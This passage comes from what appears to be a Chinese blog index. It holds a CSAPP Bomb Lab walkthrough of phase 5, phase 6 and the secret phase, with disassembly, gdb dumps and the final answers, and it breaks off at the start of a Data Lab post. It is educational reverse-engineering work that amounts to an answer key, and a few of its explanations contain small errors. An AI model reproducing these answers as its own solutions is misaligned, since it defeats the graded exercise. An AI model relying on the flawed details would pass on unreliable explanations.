#将%eax置0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; #跳转至40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; 4010e9:\te8 42 fa ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 4010ee:\t48 83 c4 20 add $0x20,%rsp 4010f2:\t5b pop %rbx 4010f3:\tc3 retq 这段代码最关键的部分是在下面这里。\n40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; 首先 对 %rax+%rbx 的值进行高位置零拓展,接着 mov %cl,(%rsp)将截取低16位，然后 and $0xf %edx，截取低四位。这里可以理解成是，将我们输入的字符，对应ASCII码的第四位，也就是十六进制最后一位。\nmovzbl 0x4024b0(%rdx),%edx 0x4024b0+%rdx的值赋值给%edx。 这里出现了一个地址 0x4024b0,我们看看它的内容是啥。\n(gdb) x/s 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;:\t\u0026quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\u0026quot; maduiersnfotvbyl...这是这个地址里边的内容。暂时不知道有什么用，接着往下看。\nmov %dl,0x10(%rsp,%rax,1) 这里就是将 %edx的低八位 赋值给 %rsp+%rax+16这个地址。注意这里的地址，是栈的地址。\n然后 %rax自增，如果%rax==6，则结束循环。 所以 %rax 从0增加到6，进行了6次循环，每次循环都从我们输入的字符中按序取一个，然后获取它的低四位（十六进制最后一位）作为下标，到0x4024b0 这个地址存放的字符串maduiersnfotvbyl...中取出字符放到%rsp+%rax+16中。\n再往下看，当循环结束后，movb $0x0,0x16(%rsp) 将 0 赋值给 %rsp+22 这里的22可以看成 16+6 则为 %rsp+6+16刚好跟前面的对应了。这里0的作用可以看成字符串结尾。\n4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 然后，将地址0x40245e的内容作为第二个参数。这里可以看看内容是啥。\n(gdb) x/s 0x40245e 0x40245e:\t\u0026quot;flyers\u0026quot; 接着，将栈中存放第一个字符的地址赋值给%rdi作为第一个参数。调用字符串比较函数，比较这两个字符串是否相等。若不相等则爆炸，相等则顺利完成任务。\n所以，我们比较的内容是 flyers,这几个字符在maduiersnfotvbyl...中出现的位置为 9EF567 那么我们只需要到ASCII码的表中找到，十六进制末位为这几个数对应的字符，即可。\n下面是我找到的其中一个。\nIONEFG 6. phase_6 终于到最后一个了，也是最长最难的一个。老规矩先上代码：\n00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp 401100:\t49 89 e5 mov %rsp,%r13 401103:\t48 89 e6 mov %rsp,%rsi 401106:\te8 51 03 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; 40110b:\t49 89 e6 mov %rsp,%r14 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d 401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; #%eax\u0026lt;=5 输入的六个数必须小于6 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #相等就会爆炸 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; # 这个循环检验输入的六个数是否互异，存在相等的两个数就是会爆炸 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; #这个循环是 用7分别减去这六个数 40116f:\tbe 00 00 00 00 mov $0x0,%esi 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx # ptr=ptr-\u0026gt;next; 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) #将节点放到栈 %rsp+%rsi*2+32 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; #进行六次 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; #%ecx\u0026lt;=1 每个数都跟1比较 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx # 一个节点 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt;# 将栈存的地址转换成地址内容 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; #前一个数要比后一个数要大或者相等，循环比较 4011e9:\te8 4c 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; 4011f7:\t48 83 c4 50 add $0x50,%rsp 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 retq 首先前面callq 40145c \u0026lt;read_six_numbers\u0026gt;这里跟前面phase_2的一样，都是输入6个数，分别存在%rsp、%rsp+4、%rsp+8、%rsp+12、%rsp+16、%rsp+20。做这道题最有效的方法就是准备好草稿纸，跟着指令，记录下每个寄存器的 值，这样子思路会清晰一些.\n401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; #%eax\u0026lt;=5 输入的六个数必须小于6 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; #相等就会爆炸 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; 40114d:\t49 83 c5 04 add $0x4,%r13 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; # 这个循环检验输入的六个数是否互异，存在相等的两个数就是会爆炸 接下来会进入第一个循环，这个循环主要是判断输入的这六个数是否互不相等，若存在两个相等的数，就会爆炸。所以输入限定条件1：六个互不相等的数。\n401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158:\t4c 89 f0 mov %r14,%rax 40115b:\tb9 07 00 00 00 mov $0x7,%ecx 401160:\t89 ca mov %ecx,%edx 401162:\t2b 10 sub (%rax),%edx 401164:\t89 10 mov %edx,(%rax) 401166:\t48 83 c0 04 add $0x4,%rax 40116a:\t48 39 f0 cmp %rsi,%rax 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; #这个循环是 用7分别减去这六个数 接着，这个循环就是对输入的六个数分别用7减去自身，并将结果覆盖原来的值。（这里标重点，后面会考）\n401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx # ptr=ptr-\u0026gt;next; 40117a:\t83 c0 01 add $0x1,%eax 40117d:\t39 c8 cmp %ecx,%eax 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; 401183:\tba d0 32 60 00 mov $0x6032d0,%edx 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) #将节点放到栈 %rsp+%rsi*2+32 40118d:\t48 83 c6 04 add $0x4,%rsi 401191:\t48 83 fe 18 cmp $0x18,%rsi 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; #进行六次 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a:\t83 f9 01 cmp $0x1,%ecx 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; #%ecx\u0026lt;=1 每个数都跟1比较 40119f:\tb8 01 00 00 00 mov $0x1,%eax 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx # 一个节点 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; 这里是一个双重循环，第一层循环进行六次，每次更新0x20(%rsp,%rsi,2)的值，也就是 %rsp+32、%rsp+40、%rsp+48、%rsp+56、%rsp+64、%rsp+72 当cmp $0x1,%ecx比较（7-输入的数）与1，若大于1则会进入内层循环，可以看到 401176。\n内层循环中，mov 0x8(%rdx),%rdx 这个是不是可以看成ptr=ptr-\u0026gt;next;因为指针大小跟0x8有点像，可以推测这应该是个链表。链表头节点指针为0x6032d0。这里循环次数也跟（7-输入的数）有关。\n我们可以看看0x6032d0这有什么内容,暂时还看不出什么名堂，那就继续往下走吧。\n(gdb) x/24w 0x6032d0 0x6032d0 \u0026lt;node1\u0026gt;:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000 0x6032e0 \u0026lt;node2\u0026gt;:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000 0x6032f0 \u0026lt;node3\u0026gt;:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000 0x603300 \u0026lt;node4\u0026gt;:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000 0x603310 \u0026lt;node5\u0026gt;:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000 0x603320 \u0026lt;node6\u0026gt;:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000 接下来又是一个循环：\n4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba:\t48 89 d9 mov %rbx,%rcx 4011bd:\t48 8b 10 mov (%rax),%rdx 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) 4011c4:\t48 83 c0 08 add $0x8,%rax 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt;# 将栈存的地址转换成地址内容 4011cd:\t48 89 d1 mov %rdx,%rcx 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; 这个循环主要的作用就是将上面循环保存到对应位置的指针修改为对应的内容。\n终于到了最后一个循环，也是决定我们输入的重要内容之一：\n4011da:\tbd 05 00 00 00 mov $0x5,%ebp 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax 4011e3:\t8b 00 mov (%rax),%eax 4011e5:\t39 03 cmp %eax,(%rbx) 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; #前一个数要比后一个数要大或者相等，循环比较 4011e9:\te8 4c 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2:\t83 ed 01 sub $0x1,%ebp 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; 可以看到这个循环其实就是在做一个链表前后值之间的比较，只有前面的值比后面的值大的时候才不会爆炸，也就是说这个链表其实是一个单调递减的链表，那我们需要看到构造这个链表的前两个循环。\n认真看的话，其实就是每次将次序为（7-%ecx）的链表节点，放到指定的地址，这个地址又是递增的。所以我们可以给节点按值由大到小进行排序\n3 \u0026lt;node1\u0026gt; 4 \u0026lt;node2\u0026gt; 5 \u0026lt;node3\u0026gt; 6 \u0026lt;node4\u0026gt; 1 \u0026lt;node5\u0026gt; 2 \u0026lt;node6\u0026gt; 但是这个顺序是由 （7-输入的数）得到的，所以我们需要再用7减一次，就得到我们想要的结果了。\n4 3 2 1 6 5 运行一下看看结果\n(gdb) run Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Border relations with Canada have never been better. Phase 1 defused. How about the next one? 1 2 4 8 16 32 That's number 2. Keep going! 1 311 Halfway there! 7 0 So you got that one. Try this one. IONEFG Good work! On to the next... 4 3 2 1 6 5 Congratulations! You've defused the bomb! 至此，该实验的几个任务算基本完成了。后面其实还有一个secret_phase。\nsecret_phase 首先，从bomb.c文件里面的内容可以看到，这个函数是没有直接显示入口的，需要我们找一下。查找以下secret_phase出现的地方,发现pahase_defused这个函数有调用到。我们看看这个函数的内容：\n00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi 4015fa:\te8 f1 f5 ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; 401604:\tbe 22 26 40 00 mov $0x402622,%esi 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e:\te8 25 fd ff ff callq 401338 \u0026lt;strings_not_equal\u0026gt; 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff callq 401242 \u0026lt;secret_phase\u0026gt; 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 retq 401659:\t90 nop 40165a:\t90 nop 40165b:\t90 nop 40165c:\t90 nop 40165d:\t90 nop 40165e:\t90 nop 40165f:\t90 nop 打印一下0x402619的内容：\n(gdb) x/s 0x402619 0x402619:\t\u0026quot;%d %d %s\u0026quot; cmp $0x3,%eax jne 401635 \u0026lt;phase_defused+0x71\u0026gt; 这里显示 两个整形数与一个字符串格式，接着就调用scanf函数输入数据。紧接着，返回值与3进行比较，如果不相等就会跳过下面的部分，可以看到刚好跳到了call secret_phase的后面一行。这个返回值也是我们输入参数的个数，也就是说当我们输入参数为3 ，且按照\u0026quot;%d %d %s\u0026quot;的格式输入就会继续往下执行，不会跳过。\n再往下，打印0x402622的内容：\n‵‵‵ 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; 40120d:\t8b 17 mov (%rdi),%edx 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi 401217:\te8 e8 ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d:\te8 d2 ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 retq 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 callq 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx 40124d:\tbe 00 00 00 00 mov $0x0,%esi 401252:\t48 89 c7 mov %rax,%rdi 401255:\te8 76 f9 ff ff callq 400bd0 \u0026lt;strtol@plt\u0026gt; #strtol函数 # 会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36 40125a:\t48 89 c3 mov %rax,%rbx 40125d:\t8d 40 ff lea -0x1(%rax),%eax 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; 401267:\te8 ce 01 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; # 输入的值比1000大会爆炸 40126c:\t89 de mov %ebx,%esi 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi 401273:\te8 8c ff ff ff callq 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt;# 当func7返回值为2才算成功 40127d:\te8 b8 01 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401282:\tbf 38 24 40 00 mov $0x402438,%edi 401287:\te8 84 f8 ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 callq 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 401292:\tc3 retq 401293:\t90 nop 401294:\t90 nop 401295:\t90 nop 401296:\t90 nop 401297:\t90 nop 401298:\t90 nop 401299:\t90 nop 40129a:\t90 nop 40129b:\t90 nop 40129c:\t90 nop 40129d:\t90 nop 40129e:\t90 nop 40129f:\t90 nop 输出 0x6030f0这个位置的内容，如下，可以看到是一棵二叉树。其中n1为根节点，nxy为第x层第y个节点。\n(gdb) x/120a 0x6030f0 0x6030f0 \u0026lt;n1\u0026gt;:\t0x24\t0x603110 \u0026lt;n21\u0026gt; 0x603100 \u0026lt;n1+16\u0026gt;:\t0x603130 \u0026lt;n22\u0026gt;\t0x0 0x603110 \u0026lt;n21\u0026gt;:\t0x8\t0x603190 \u0026lt;n31\u0026gt; 0x603120 \u0026lt;n21+16\u0026gt;:\t0x603150 \u0026lt;n32\u0026gt;\t0x0 0x603130 \u0026lt;n22\u0026gt;:\t0x32\t0x603170 \u0026lt;n33\u0026gt; 0x603140 \u0026lt;n22+16\u0026gt;:\t0x6031b0 \u0026lt;n34\u0026gt;\t0x0 0x603150 \u0026lt;n32\u0026gt;:\t0x16\t0x603270 \u0026lt;n43\u0026gt; 0x603160 \u0026lt;n32+16\u0026gt;:\t0x603230 \u0026lt;n44\u0026gt;\t0x0 0x603170 \u0026lt;n33\u0026gt;:\t0x2d\t0x6031d0 \u0026lt;n45\u0026gt; 0x603180 \u0026lt;n33+16\u0026gt;:\t0x603290 \u0026lt;n46\u0026gt;\t0x0 0x603190 \u0026lt;n31\u0026gt;:\t0x6\t0x6031f0 \u0026lt;n41\u0026gt; 0x6031a0 \u0026lt;n31+16\u0026gt;:\t0x603250 \u0026lt;n42\u0026gt;\t0x0 0x6031b0 \u0026lt;n34\u0026gt;:\t0x6b\t0x603210 \u0026lt;n47\u0026gt; 0x6031c0 \u0026lt;n34+16\u0026gt;:\t0x6032b0 \u0026lt;n48\u0026gt;\t0x0 0x6031d0 \u0026lt;n45\u0026gt;:\t0x28\t0x0 0x6031e0 \u0026lt;n45+16\u0026gt;:\t0x0\t0x0 0x6031f0 \u0026lt;n41\u0026gt;:\t0x1\t0x0 0x603200 \u0026lt;n41+16\u0026gt;:\t0x0\t0x0 0x603210 \u0026lt;n47\u0026gt;:\t0x63\t0x0 0x603220 \u0026lt;n47+16\u0026gt;:\t0x0\t0x0 0x603230 \u0026lt;n44\u0026gt;:\t0x23\t0x0 0x603240 \u0026lt;n44+16\u0026gt;:\t0x0\t0x0 0x603250 \u0026lt;n42\u0026gt;:\t0x7\t0x0 那么我们可以将func7 转换为c语言代码：\nint func7(node *root,int num){ if(root==NULL)return 0; if(root-\u0026gt;val==num)return 0; else if(root-\u0026gt;val \u0026lt; num)return 2*func7(root-\u0026gt;right)+1; return 2*func7(root-\u0026gt;left); } 当我们想要func7返回的结果为2的时候，应当执行的结果为 2*(1+(0))。所以 num \u0026lt; root-\u0026gt;val\u0026amp;\u0026amp;num \u0026gt; root-\u0026gt;left-\u0026gt;val\u0026amp;\u0026amp;num==root-\u0026gt;left-\u0026gt;right-\u0026gt;val。查看\u0026lt;n32\u0026gt; :0x16 这就是我们要的答案。0x16 转10进制 22。\n总结 这次实验对自己汇编语言这块的掌握巩固有很大促进作用，通过实验，自己学习到了汇编语言的一些语法，学会看一些汇编代码了。同时也开始接触到gdb这个工具，以前就是写c++或者c语言代码，用这个做断点，然后按F5调试使用，没有用它来做过其他工作，也不知了解它的强大的功能，在实验 中也是多次用到了，例如查看某个地址的内容等。实验虽然结束了，但是对汇编以及GDB的学习还需要继续下去！\n","id":7,"section":"posts","summary":"CSAPP\u0026ndash;Bomb Lab实验记录 前言 本实验是《深入理解计算机系统》一书中的附带实验——二进制炸弹实验。二进制炸弹是一个作为目标代码文件提供给学生们的程序。运","tags":["csapp-lab","汇编"],"title":"CSAPP--Bomb Lab实验记录","uri":"https://lincx-911.github.io/2021/12/bomb_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Data Lab实验记录 [TOC]\n前言 Students implement simple logical, two\u0026rsquo;s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.\n实验要求 /* * Instructions to Students: * * STEP 1: Read the following instructions carefully. */ You will provide your solution to the Data Lab by editing the collection of functions in this source file. INTEGER CODING RULES: Replace the \u0026quot;return\u0026quot; statement in each function with one or more lines of C code that implements the function. Your code must conform to the following style: int Funct(arg1, arg2, ...) { /* brief description of how your implementation works */ int var1 = Expr1; ... int varM = ExprM; varJ = ExprJ; ... varN = ExprN; return ExprR; } Each \u0026quot;Expr\u0026quot; is an expression using ONLY the following: 1. Integer constants 0 through 255 (0xFF), inclusive. You are not allowed to use big constants such as 0xffffffff. 2. Function arguments and local variables (no global variables). 3. Unary integer operations ! ~ 4. Binary integer operations \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; Some of the problems restrict the set of allowed operators even further. Each \u0026quot;Expr\u0026quot; may consist of multiple operators. You are not restricted to one operator per line. You are expressly forbidden to: 1. Use any control constructs such as if, do, while, for, switch, etc. 2. Define or use any macros. 3. Define any additional functions in this file. 4. Call any functions. 5. Use any other operations, such as \u0026amp;\u0026amp;, ||, -, or ?: 6. Use any form of casting. 7. Use any data type other than int. This implies that you cannot use arrays, structs, or unions. You may assume that your machine: 1. Uses 2s complement, 32-bit representations of integers. 2. Performs right shifts arithmetically. 3. Has unpredictable behavior when shifting an integer by more than the word size. EXAMPLES OF ACCEPTABLE CODING STYLE: /* * pow2plus1 - returns 2^x + 1, where 0 \u0026lt;= x \u0026lt;= 31 */ int pow2plus1(int x) { /* exploit ability of shifts to compute powers of 2 */ return (1 \u0026lt;\u0026lt; x) + 1; } /* * pow2plus4 - returns 2^x + 4, where 0 \u0026lt;= x \u0026lt;= 31 */ int pow2plus4(int x) { /* exploit ability of shifts to compute powers of 2 */ int result = (1 \u0026lt;\u0026lt; x); result += 4; return result; } FLOATING POINT CODING RULES For the problems that require you to implent floating-point operations, the coding rules are less strict. You are allowed to use looping and conditional control. You are allowed to use both ints and unsigneds. You can use arbitrary integer and unsigned constants. You are expressly forbidden to: 1. Define or use any macros. 2. Define any additional functions in this file. 3. Call any functions. 4. Use any form of casting. 5. Use any data type other than int or unsigned. This means that you cannot use arrays, structs, or unions. 6. Use any floating point data types, operations, or constants. NOTES: 1. Use the dlc (data lab checker) compiler (described in the handout) to check the legality of your solutions. 2. Each function has a maximum number of operators (! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt;) that you are allowed to use for your implementation of the function. The max operator count is checked by dlc. Note that '=' is not counted; you may use as many of these as you want without penalty. 3. Use the btest test harness to check your functions for correctness. 4. Use the BDD checker to formally verify your functions 5. The maximum number of ops for each function is given in the header comment for each function. If there are any inconsistencies between the maximum ops in the writeup and in this file, consider this file the authoritative source. /* * STEP 2: Modify the following functions according the coding rules. * * IMPORTANT. TO AVOID GRADING SURPRISES: * 1. Use the dlc compiler to check that your solutions conform * to the coding rules. * 2. Use the BDD checker to formally verify that your solutions produce * the correct answers. */ 实验内容 1. bitAnd 题目要求只能使用 ~ 与 | 进行解答。可以想想摩尔运算 A\u0026amp;B = ~（（~A) | (~B) )\n/* * bitAnd - x\u0026amp;y using 